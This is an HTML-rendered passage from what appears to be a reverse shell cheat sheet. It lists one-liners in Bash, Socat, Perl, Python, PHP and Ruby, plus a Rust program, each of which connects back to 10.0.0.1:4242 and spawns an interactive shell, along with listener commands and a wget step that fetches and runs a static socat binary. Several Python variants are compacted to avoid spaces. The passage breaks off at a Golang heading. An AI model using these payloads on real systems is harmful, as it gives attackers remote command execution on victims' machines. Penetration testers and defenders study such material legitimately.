<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.0.0.1/4242<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span><span class="w"> </span><span class="m">196</span>&lt;&gt;/dev/tcp/10.0.0.1/4242<span class="p">;</span><span class="w"> </span>sh<span class="w"> </span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">196</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>/bin/bash<span class="w"> </span>-l<span class="w"> </span>&gt;<span class="w"> </span>/dev/tcp/10.0.0.1/4242<span class="w"> </span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div>
<h3 id="bash-udp">Bash UDP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Victim:
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sh<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/udp/10.0.0.1/4242<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Listener:
<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>nc<span class="w"> </span>-u<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4242</span>
</code></pre></div>
<p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
<h3 id="socat">Socat</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">user</span><span class="nv">@attack</span><span class="p">$</span> <span class="n">socat</span> <span class="n">file</span><span class="p">:`</span><span class="n">tty</span><span class="p">`,</span><span class="n">raw</span><span class="p">,</span><span class="n">echo</span><span class="p">=</span><span class="n">0</span> <span class="n">TCP-L</span><span class="p">:</span><span class="n">4242</span>
<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">socat</span> <span class="n">exec</span><span class="p">:</span><span class="s1">&#39;bash -li&#39;</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span> <span class="n">tcp</span><span class="p">:</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">4242</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">user</span><span class="nv">@victim</span><span class="p">$</span> <span class="nb">wget </span><span class="n">-q</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">andrew-d</span><span class="p">/</span><span class="n">static-binaries</span><span class="p">/</span><span class="n">raw</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">binaries</span><span class="p">/</span><span class="n">linux</span><span class="p">/</span><span class="n">x86_64</span><span class="p">/</span><span class="n">socat</span> <span class="n">-O</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">socat</span><span class="p">;</span> <span class="n">chmod</span> <span class="p">+</span><span class="n">x</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">socat</span><span class="p">;</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">socat</span> <span class="n">exec</span><span class="p">:</span><span class="s1">&#39;bash -li&#39;</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span> <span class="n">tcp</span><span class="p">:</span><span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">:</span><span class="n">4242</span>
</code></pre></div>
<p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="perl">Perl</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="n">NOTE:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">only</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">MIO</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s">&#39;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
</code></pre></div>
<h3 id="python">Python</h3>
<p>Linux only</p>
<p>IPv4</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">export</span> <span class="n">RHOST</span><span class="o">=</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">;</span><span class="n">export</span> <span class="n">RPORT</span><span class="o">=</span><span class="mi">4242</span><span class="p">;</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
</code></pre></div>
<p>IPv4 (No Spaces)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);os=__import__(&quot;os&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;</span>
</code></pre></div>
<p>IPv4 (No Spaces, Shortened)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;s=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&quot;10.0.0.1&quot;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&quot;socket&quot;);p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&quot;socket&quot;);c=a(&quot;subprocess&quot;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;c([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
</code></pre></div>
<p>IPv4 (No Spaces, Shortened Further)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;10.0.0.1&quot;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&quot;socket&quot;).socket;p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b();s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;b=a(&quot;socket&quot;).socket;c=a(&quot;subprocess&quot;).call;s=b();s.connect((&quot;10.0.0.1&quot;,4242));f=s.fileno;c([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#39;</span>
</code></pre></div>
<p>IPv6</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<p>IPv6 (No Spaces)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<p>IPv6 (No Spaces, Shortened)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;a=__import__;c=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39;</span>
</code></pre></div>
<p>Windows only (Python2)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</span>
</code></pre></div>
<p>Windows only (Python3)</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(\&quot;</span><span class="k">while</span><span class="p">(</span><span class="n">True</span><span class="p">):</span><span class="n">o</span><span class="p">=</span><span class="n">os</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">1024</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">o</span><span class="p">)\</span><span class="s2">&quot;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\&quot;</span><span class="k">while</span><span class="p">(</span><span class="n">True</span><span class="p">):</span><span class="n">i</span><span class="p">=</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">1024</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">i</span><span class="p">)\</span><span class="s2">&quot;,globals())).start()&quot;</span>
</code></pre></div>
<h3 id="php">PHP</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span>
</code></pre></div>
<h3 id="ruby">Ruby</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="s1">&#39;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop{c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &quot;failed: </span><span class="si">#{</span><span class="vg">$_</span><span class="si">}</span><span class="s1">&quot;}&#39;</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="ss">NOTE</span><span class="p">:</span><span class="w"> </span><span class="no">Windows</span><span class="w"> </span><span class="n">only</span>
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">ruby</span><span class="w"> </span><span class="o">-</span><span class="n">rsocket</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
</code></pre></div>
<h3 id="rust">Rust</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">net</span><span class="p">::</span><span class="n">TcpStream</span><span class="p">;</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">os</span><span class="p">::</span><span class="n">unix</span><span class="p">::</span><span class="n">io</span><span class="p">::{</span><span class="n">AsRawFd</span><span class="p">,</span><span class="w"> </span><span class="n">FromRawFd</span><span class="p">};</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span><span class="p">::</span><span class="n">process</span><span class="p">::{</span><span class="n">Command</span><span class="p">,</span><span class="w"> </span><span class="n">Stdio</span><span class="p">};</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="k">fn</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TcpStream</span><span class="p">::</span><span class="n">connect</span><span class="p">(</span><span class="s">&quot;10.0.0.1:4242&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="n">as_raw_fd</span><span class="p">();</span>
<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="w">    </span><span class="n">Command</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="w">        </span><span class="p">.</span><span class="n">arg</span><span class="p">(</span><span class="s">&quot;-i&quot;</span><span class="p">)</span>
<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="w">        </span><span class="p">.</span><span class="n">stdin</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="w">        </span><span class="p">.</span><span class="n">stdout</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="w">        </span><span class="p">.</span><span class="n">stderr</span><span class="p">(</span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Stdio</span><span class="p">::</span><span class="n">from_raw_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span><span class="w"> </span><span class="p">})</span>
<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="w">        </span><span class="p">.</span><span class="n">spawn</span><span class="p">()</span>
<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">()</span>
<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="w">        </span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="w">        </span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span>
<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a><span class="p">}</span>
</code></pre></div>
<h3 id="golang">Golang</h3>
